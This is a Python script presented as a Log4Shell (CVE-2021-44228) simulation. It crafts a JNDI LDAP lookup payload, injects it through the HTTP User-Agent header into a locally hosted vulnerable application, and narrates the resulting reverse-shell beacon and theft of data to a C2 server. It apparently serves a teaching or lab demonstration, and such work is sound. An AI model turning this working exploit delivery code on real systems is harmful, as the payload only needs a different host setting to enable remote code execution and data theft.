"""
Log4Shell Simulation - Attacker CLI
=====================================
This simulates the adversary crafting and sending the malicious
Log4Shell exploit payload to the vulnerable application.

The attacker injects the JNDI lookup string into the HTTP User-Agent
header. Any header that gets logged by Log4j can be the injection
point — User-Agent, X-Forwarded-For, X-Api-Version, Referer, etc.

In the real-world Log4Shell attacks, the payload was also injected via:
  - Minecraft chat messages
  - Login form usernames
  - Search queries
  - Email subjects
  - AWS key names
  - Apple device names (via iCloud)

CVE-2021-44228  |  CVSS 10.0 (Critical)
"""

import urllib.request
import sys
import time

# ─── Configuration ───────────────────────────────────────────────────────────
TARGET_URL   = "http://127.0.0.1:8080/"
LDAP_HOST    = "127.0.0.1"
LDAP_PORT    = 1389
EXPLOIT_NAME = "Exploit"

# ─── ANSI Colours ────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"


def main():
    # The malicious JNDI payload string
    payload = f"${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT}/{EXPLOIT_NAME}}}"

    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════╗
║              LOG4SHELL EXPLOIT LAUNCHER                   ║
║              CVE-2021-44228  |  CVSS 10.0                ║
╚══════════════════════════════════════════════════════════╝{RESET}

{DIM}This tool crafts and sends the Log4Shell exploit payload to
a vulnerable application server. The payload is injected via
the HTTP User-Agent header.{RESET}
""")

    print(f"  {CYAN}Target:{RESET}       {TARGET_URL}")
    print(f"  {CYAN}LDAP Server:{RESET}  ldap://{LDAP_HOST}:{LDAP_PORT}")
    print(f"  {CYAN}Payload:{RESET}      {RED}{BOLD}{payload}{RESET}")
    print()

    print(f"  {YELLOW}[1/3] Crafting malicious HTTP request...{RESET}")
    time.sleep(0.8)

    print(f"  {YELLOW}[2/3] Injecting JNDI payload into User-Agent header...{RESET}")
    time.sleep(0.5)

    print(f"  {YELLOW}[3/3] Sending exploit to target...{RESET}")
    time.sleep(0.3)

    try:
        req = urllib.request.Request(TARGET_URL, headers={
            "User-Agent": payload,
            "Accept":     "text/html",
        })
        response = urllib.request.urlopen(req, timeout=15)
        status = response.getcode()

        print(f"\n  {GREEN}[✓] Exploit delivered successfully!{RESET}")
        print(f"  {DIM}HTTP Response: {status}{RESET}")
        print(f"""
  {RED}{'─'*50}{RESET}
  {RED}{BOLD}The vulnerable application has now:{RESET}
  {DIM}  1. Logged our malicious User-Agent with Log4j{RESET}
  {DIM}  2. Performed a JNDI/LDAP lookup to our server{RESET}
  {DIM}  3. Downloaded our malicious Exploit.class{RESET}
  {DIM}  4. Executed our payload (reverse shell beacon){RESET}
  {DIM}  5. Sent system info back to our C2 server{RESET}
  {RED}{'─'*50}{RESET}

  {RED}{BOLD}💀 Target system is now fully compromised.{RESET}
  {DIM}Check the C2 server (HTTP payload server) terminal{RESET}
  {DIM}to see the stolen system information.{RESET}
""")

    except Exception as e:
        print(f"\n  {RED}[✗] Exploit delivery failed: {e}{RESET}")
        print(f"  {DIM}Make sure the vulnerable app is running on {TARGET_URL}{RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
